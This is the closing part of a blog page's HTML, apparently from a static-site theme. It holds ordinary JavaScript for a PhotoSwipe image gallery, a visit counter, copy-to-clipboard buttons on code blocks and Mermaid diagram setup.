                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>